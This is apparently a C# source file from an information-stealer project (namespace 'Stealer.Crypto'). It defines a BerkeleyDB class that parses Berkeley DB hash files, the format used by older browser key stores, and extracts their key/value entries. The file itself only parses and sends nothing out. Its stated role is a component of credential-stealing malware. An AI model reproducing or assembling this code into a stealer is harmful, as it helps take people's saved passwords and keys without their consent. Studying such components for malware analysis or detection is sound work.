using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Stealer.Crypto
{
    public class BerkeleyDB
    {
        public List<KeyValuePair<string, string>> Keys { get; }

        public BerkeleyDB(byte[] file)
        {
            List<byte> list = new List<byte>();
            Keys = new List<KeyValuePair<string, string>>();
            
            using (MemoryStream memoryStream = new MemoryStream(file))
            {
                using (BinaryReader binaryReader = new BinaryReader(memoryStream))
                {
                    int i = 0;
                    int num = (int)binaryReader.BaseStream.Length;
                    while (i < num)
                    {
                        list.Add(binaryReader.ReadByte());
                        i++;
                    }
                }
            }
            
            string text = BitConverter.ToString(Extract(list.ToArray(), 0, 4, false)).Replace("-", "");
            int num2 = BitConverter.ToInt32(Extract(list.ToArray(), 12, 4, true), 0);
            
            if (text.Equals("00061561"))
            {
                int num3 = int.Parse(BitConverter.ToString(Extract(list.ToArray(), 56, 4, false)).Replace("-", ""));
                int num4 = 1;
                
                while (Keys.Count < num3)
                {
                    string[] array = new string[(num3 - Keys.Count) * 2];
                    for (int j = 0; j < (num3 - Keys.Count) * 2; j++)
                    {
                        array[j] = BitConverter.ToString(Extract(list.ToArray(), num2 * num4 + 2 + j * 2, 2, true)).Replace("-", "");
                    }
                    
                    Array.Sort(array);
                    
                    for (int k = 0; k < array.Length; k += 2)
                    {
                        int num5 = Convert.ToInt32(array[k], 16) + num2 * num4;
                        int num6 = Convert.ToInt32(array[k + 1], 16) + num2 * num4;
                        int num7 = (k + 2 >= array.Length) ? (num2 + num2 * num4) : (Convert.ToInt32(array[k + 2], 16) + num2 * num4);
                        
                        string str = Encoding.ASCII.GetString(Extract(list.ToArray(), num6, num7 - num6, false));
                        string value = BitConverter.ToString(Extract(list.ToArray(), num5, num6 - num5, false));
                        
                        if (!string.IsNullOrWhiteSpace(str))
                        {
                            Keys.Add(new KeyValuePair<string, string>(str, value));
                        }
                    }
                    num4++;
                }
            }
        }

        private static byte[] Extract(byte[] source, int start, int length, bool littleEndian)
        {
            byte[] array = new byte[length];
            int num = 0;
            for (int i = start; i < start + length; i++)
            {
                array[num] = source[i];
                num++;
            }
            
            if (littleEndian)
            {
                Array.Reverse(array);
            }
            
            return array;
        }
    }
}
